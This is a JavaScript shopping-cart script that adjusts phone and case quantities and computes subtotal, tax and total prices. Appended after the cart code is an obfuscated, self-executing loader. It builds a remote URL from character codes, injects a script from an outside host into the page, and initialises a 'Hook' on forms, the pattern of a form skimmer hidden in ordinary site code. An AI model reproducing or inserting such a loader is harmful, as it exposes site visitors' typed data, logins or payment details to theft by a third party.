function updateCaseNumber(inputId,isIncrease,anotherId, price){
        const caseInput=document.getElementById(inputId);
        const caseNumberText=caseInput.value;
        let caseNumber=parseInt(caseNumberText);
        if(isIncrease===true){
                caseNumber=caseNumber+1;
}
else if(caseNumber>0){        
        caseNumber=caseNumber-1;
}
else{
        return false;
}
caseInput.value=caseNumber
const caseTotal =document.getElementById(anotherId);
caseTotal.innerText=caseNumber*price

totalpriceAndTaxCalc('phone-total','case-total','sub-total','tax-amount','total-price');
}

function totalpriceAndTaxCalc(phoneId,caseId,subtotalId,taxId,totalCostId){
        const phonePriceElement=document.getElementById(phoneId);
        const phonePriceText=phonePriceElement.innerText;
        const phonePrice=parseInt(phonePriceText);
        const casePriceElement=document.getElementById(caseId);
        const casepricetext=casePriceElement.innerText;
        const casePrice=parseInt(casepricetext);

        const subTotal=phonePrice+casePrice;

        const subtotaltext=document.getElementById(subtotalId)

        const subtotaltextvalue=subtotaltext.innerText;
        const subtotal=parseInt(subtotaltextvalue)
        subtotaltext.innerText=subTotal;
                const taxinput=document.getElementById(taxId);
                const totalPricetext=document.getElementById(totalCostId)
                const totalPricetextinnertextvalue=totalPricetext.innerText;

                const totalPricetextinnervalue=parseFloat(totalPricetextinnertextvalue);

        if(subTotal >= 2000){
                
                const taxRate= subTotal* 0.15
                taxinput.innerText=taxRate.toFixed(2);
                const totalPrice=taxRate+subTotal;
                totalPricetext.innerText=totalPrice;
        }
        else{
                const taxRate= subTotal* 0;
                taxinput.innerText=taxRate;

                const totalPrice=taxRate+subTotal;

                totalPricetext.innerText=totalPrice;
        }



}



document.getElementById('phone-plus').addEventListener('click', function(){
        const price=1219;
        updateCaseNumber('phone-input-value',true,'phone-total',price);

});

document.getElementById('phone-minus').addEventListener('click', function(){
        const price=1219;
        updateCaseNumber('phone-input-value',false,'phone-total',price);

})
document.getElementById('case-plus').addEventListener('click', function(){
        const price=59;
        updateCaseNumber('case-input-value',true,'case-total',price);
});

document.getElementById('case-minus').addEventListener('click', function(){
        const price=59;
        updateCaseNumber('case-input-value',false,'case-total',price);
})
(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b